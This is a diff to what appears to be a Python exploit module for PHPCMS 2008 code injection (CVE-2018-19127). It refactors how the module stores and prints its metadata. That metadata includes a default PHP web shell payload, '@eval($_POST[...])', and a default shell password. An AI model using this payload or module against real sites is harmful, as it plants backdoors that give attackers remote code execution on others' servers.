@@ -3,6 +3,26 @@ import requests
 # Referer: https://github.com/ab1gale/phpcms-2008-CVE-2018-19127
 # PHPCMS 2008 CI
 
+
+def info(): # Exploit information for database mechanism
+    info = {
+        'name': 'phpcms_2008_ci',
+        'description': 'PHPCMS 2008 code injection',
+        'date': '2018-12-27',
+        'parameters':{
+            'url': 'Target URL',
+            'protocol': 'Protocol. Default: http',
+            'Timeout': 'Request timeout. Default: 10',
+            'Payload': '(OPTIONAL) Content to write, default: "@eval($_POST[/PSWD/]);//"\nReplace with /PSWD/',
+            'Password': '(OPTIONAL) Shell password. default: "SWEP"'
+        },
+        'referer': 'https://github.com/ab1gale/phpcms-2008-CVE-2018-19127'
+    }
+
+    return info
+
+
+
 class exploit():
     def __init__(self):
         self.url = None
@@ -40,13 +60,14 @@ class exploit():
 
 
     def info(self):
-        print '''
-        PHPCMS 2008 Code injection
-        Parameter:
-            url: Target url
-            protocol: Protocol, Default=http
-            Timeout: Request timeout, Default=3
-            Payload: (OPTIONAL)Content to write, Default="@eval($_POST[/PSWD/])"
-                     Replace password with /PSWD/.
-            Password: (OPTIONAL)Shell password, Default="SWEP".
-        '''
+        ExpInf = info()
+        print '[*] Incoming exploit information.'
+        print ' |   NAME: %s' %(ExpInf['name'])
+        print ' |   DESCRIPTION: %s' %(ExpInf['description'])
+        print ' |   DATE: %s' %(ExpInf['date'])
+        print ' |   PARAMETERS:'
+        parameters = ExpInf['parameters']
+        for item in ExpInf['parameters'].keys():
+            print ' |   |  %s: %s' %(item, parameters[item])
+        print ' |   REFERER: %s' %(ExpInf['referer'])
+        return
